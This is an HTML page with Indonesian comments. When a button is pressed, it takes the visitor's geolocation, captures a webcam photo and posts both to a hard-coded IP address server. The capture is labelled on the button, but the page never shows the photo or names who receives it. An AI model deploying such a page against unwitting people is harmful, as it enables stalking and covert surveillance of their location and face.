<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
</head>
<body>
    <h1>Location Tracker</h1>
    <button id="trackLocation">Track Location and Take Photo</button>
    <script>
        document.getElementById('trackLocation').addEventListener('click', async () => {
            // Meminta izin lokasi
            navigator.geolocation.getCurrentPosition(async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Mengambil foto
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Menunggu beberapa detik untuk mengatur video
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; // Lebar gambar
                    canvas.height = 480; // Tinggi gambar
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    video.pause();
                    stream.getTracks().forEach(track => track.stop()); // Hentikan video

                    const photoBlob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg');
                    });

                    // Mengirim data ke backend
                    const formData = new FormData();
                    formData.append('latitude', latitude);
                    formData.append('longitude', longitude);
                    formData.append('photo', photoBlob, 'photo.jpg');

                    await fetch('http://180.241.180.188:3000/submit', {
                        method: 'POST',
                        body: formData,
                    });
                }, 3000); // Mengambil foto setelah 3 detik
            }, (error) => {
                console.error('Error getting location:', error);
            });
        });
    </script>
</body>
</html
